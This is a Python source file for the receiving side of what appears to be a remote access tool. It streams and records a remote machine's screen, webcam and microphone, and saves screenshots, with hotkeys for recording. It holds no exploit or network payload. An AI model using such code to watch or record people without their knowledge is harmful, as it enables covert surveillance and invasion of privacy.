import io
import cv2,pyaudio,wave
import os,time
import base64
import keyboard
from PIL import Image,ImageTk
import zlib
import tkinter as tk
import numpy as np
from server.data_processor import DataProcessor


class MediaCapture(DataProcessor):
    """This module Take full control of the Media access.
    
    ## Features:
    - You can save screenshots,screenshare,webcam.
    - You can access live screenshare and webcam via tkinter window.
    - You can hear getting live audio.
    - You can record while live capture using keyboard hot keys (eg:r for start/stop,esc for terminate).
    
    ## Usage:

    window(title,size) - To create a window for live share with title and window size.

    on_key(event)   - Functioning the captured key from keyboard

    _audio_capture(),_video_capture(),_save_screenshots() - save the capture as files

    mic() and update_frame() is used for receive the different type of media and process 

    streaming() - To show the live capture

    """
   
    def __init__(self,conn,name,event,record=False):
        super().__init__(conn)

        self.event = event if event != "mic" else "audio"
        self.name = name
        self._fourcc = cv2.VideoWriter_fourcc(*"XVID")
        self._closed = False
        self.only_record = record
        self.capture = True if self.only_record else False
        self.out = None 
        self._hook = None
        self.num = 0

    def window(self,title,size):  
        "Create a windows and return the label"

        self.root = tk.Tk()
        self.root.title(title)
        self.root.geometry(size)
        label = tk.Label(self.root)
        label.pack()

        return label
    
    def on_key(self,event):
        "Process keyboard function"

        if hasattr(event,"keysym"):
            key = event.keysym
        elif hasattr(event,"name"):
            key = event.name
        else:
            key = str(event)
        
        if key in ["Escape","esc"]:
            self.on_close()
            return
        elif key == "r":
            self.capture = not self.capture 
            if self.capture and self.event == "audio":
                print("\n\t[*] Audio Recording Started...")
                self._audio_capture()

            elif self.capture and self.event in ["webcam","screenshare"]:
                print(f"\n\t[*] {self.event} Recording Started...")
                self._video_capture()

            else:
                print(f"\n\t{self.event} Recording Stoped...")

                self.out = None
                
    def on_close(self):

        if not getattr(self,"_closed",False):
            self._closed = True
            self.send({"type":"media","action":"stopshare"})

    def _clean_up(self):
        """Unhook keyboard and reset state."""

        if self._hook is not None:
            keyboard.unhook(self._hook)
            self._hook = None
        self.only_record = False
        self.out = None

    def date_time(self):

        date = time.strftime("%Y-%m-%d")
        ts = time.strftime("%H-%M-%S")

        return date,ts
    
    def _audio_capture(self):

        date , ts = self.date_time()
        file = f"audio_{ts}.wav"
        folder = f"{self.name}/audio/{date}"

        if not os.path.exists(folder):
            os.makedirs(folder)
        while os.path.exists(f"{folder}/{file}"):
            file = f"audio_{time.strftime("%H-%M-%S")}.wav"
        
        self.out = wave.open(f"{folder}/{file}", 'wb')
        self.out.setnchannels(self.CHANNELS)
        self.out.setsampwidth(pyaudio.PyAudio().get_sample_size(self.FORMAT))
        self.out.setframerate(self.RATE)

    def _video_capture(self):

        date , ts = self.date_time()
        file = f"{self.event}_{ts}.avi"
        folder = f"{self.name}/video/{date}"

        if not os.path.exists(folder):
            os.makedirs(folder)
        while os.path.exists(f"{folder}/{file}"):
            self.num += 1
            file = f"{self.event}_{time.strftime("%H-%M-%S")}.avi"

        self.out = cv2.VideoWriter(f"{folder}/{file}", self._fourcc, 8, (1400, 800))

    def _save_screenshots(self,data):

        date , ts = self.date_time()
        file = f"screenshot_{ts}.jpg"
        folder = f"{self.name}/screenshot/{date}"

        if not os.path.exists(folder):
            os.makedirs(folder)
        file_path = os.path.join(folder,file)

        while os.path.exists(file_path):
            file = f"screenshot_{time.strftime("%H-%M-%S")}.jpg"
            file_path = os.path.join(folder,file)

        compressed = base64.b64decode(data)
        jpeg_data = zlib.decompress(compressed)
        img = Image.open(io.BytesIO(jpeg_data))
        img.save(file_path)
        

    def screenshot(self):
        """Single screenshot — saves one image."""

        data = self.receive()
        
        if data["type"] == "media" and data["action"] =="screenshot":
            self._save_screenshots(data["data"])
            print(f"\n\t[+] Screenshots Saved Successfully ... ")

    def record_screenshots(self):
        """Continuous screenshot capture — saves frames until user presses esc."""

        print(f"\n\t[+] Continuous screenshot capture started...")
        print(" \tPress 'esc' to stop\n")

        self._hook = keyboard.on_press(self.on_key)
        num = 0

        while True:
            data = self.receive()

            if data is None:
                self._clean_up()
                print("\n\t[-] Screenshot capture closed.")
                break

            if not data:
                self._clean_up()
            
            if data["type"] == "media" and data["action"] =="screenshot":
                self._save_screenshots(data["data"])
                num += 1
                print(f"\r\t\tNUM OF Screenshots Taken: {num}",end="")


    def update_frame(self):
        """Process received frame — handles both live display and record-only."""

        data = self.receive()
        
        if data is None:
            print(f"[-]  {self.event} Closed ....")
            if self.only_record:
                self._clean_up()

            else:
                self.root.destroy()
            return 
        
        if data["type"] == "media":
            compressed = base64.b64decode(data["data"])
            jpeg_data = zlib.decompress(compressed)
            img = Image.open(io.BytesIO(jpeg_data))

            if data.get("action") == "webcam":
                img = img.transpose(Image.FLIP_LEFT_RIGHT)

        if self.capture and self.out is not None:
            img = img.resize((1400,800))
            frame = np.array(img)
            self.out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))

        if not self.only_record:

            self.root.update_idletasks()
            width, height = self.root.winfo_width(), self.root.winfo_height()
            img = img.resize((width, height))
            img_tk = ImageTk.PhotoImage(img)
            self.label.config(image=img_tk)
            self.label.image = img_tk
            self.after_id = self.root.after(20, self.update_frame)

    def streaming(self):
        """Single method for screenshare and webcam — It can be live Share or record-only."""
        
        print(f"\n[+] {self.event} Started ....")
        if self.only_record:
            self._video_capture()
            print(" \tPress 'r' to start/stop recording, 'esc' to stop")
            self._hook = keyboard.on_press(self.on_key)
            while self.only_record:
                self.update_frame()
                
        else:
            print(f"\tPress 'esc' button to close the screen\n\tPress 'r' Buttion to start/stop recording ")
            self.label = self.window(f"{self.name} - {self.event}","800x600")
            self.update_frame()
            self.root.bind("<Key>",self.on_key)
            self.root.protocol("WM_DELETE_WINDOW",self.on_close)
            self.root.mainloop()

    def mic(self):
        """Capture the audio with live playback or record-only."""

        p = pyaudio.PyAudio()
        CHUNK = 1024
        self.FORMAT = pyaudio.paInt16
        self.CHANNELS = 1
        self.RATE = 44100

        print(f"\n[+] {self.event} Started ....")
        if self.only_record:
            self._audio_capture()
            stream = None
            print(" \tPress 'r' to start/stop recording, 'esc' to stop")

        else:

            stream = p.open(format=self.FORMAT, channels=self.CHANNELS,
                            rate=self.RATE, output=True,
                            frames_per_buffer=CHUNK)
            print(" \tPress 'esc' close the capture , 'r' to start/stop recording")

        self._hook = keyboard.on_press(self.on_key)
        
        while True:

            
            data = self.receive()
            if data is None:
                self._clean_up()
                print(f"\t[-] {self.event} Closed..")
                return
            
            if not data:
                self._clean_up()
                return
            
            if data["type"] == "media" and data["action"] == "mic":
                mic_data = bytes.fromhex(data["data"])

                if not self.only_record:
                    stream.write(mic_data)

                if self.capture and self.out is not None:
                    self.out.writeframes(mic_data)  